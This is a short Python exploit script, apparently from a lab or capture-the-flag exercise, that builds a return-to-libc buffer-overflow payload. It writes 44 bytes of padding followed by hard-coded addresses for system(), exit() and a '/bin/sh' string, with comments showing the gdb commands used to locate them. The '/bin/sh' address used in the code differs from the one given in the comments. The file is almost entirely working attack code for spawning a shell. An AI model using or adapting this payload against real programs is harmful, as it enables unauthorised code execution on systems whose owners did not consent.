#!/usr/bin/env python3
# 0xf7dcecd0 = system address  | command : p system in gdb

# 0xf7f400d5 = /bin/sh address | command : find 0xf7d87000,0xf7fae000,"/bin/sh"
# 0xffffdeb0
# verify /bin/sh               | command : x/s 0xf7f400d5
# 1b90d5 <- strings find in gdb

# 0xffffdeaa + 6 = 0xffffdeb0
# 0xffffe0f6 from c program
# 0xf7dc11f0 = exit address    | command : p exit in gdb 
import sys

start = b"\x90" * 44

address = 0xf7dcecd0    
system_address = address.to_bytes(4, byteorder='little') 

address = 0xf7dc11f0
exit_address = address.to_bytes(4, byteorder='little') 

address = 0xf80f91aa
bin_sh_address = address.to_bytes(4, byteorder='little') 

payload = start + system_address + exit_address + bin_sh_address

sys.stdout.buffer.write(payload)
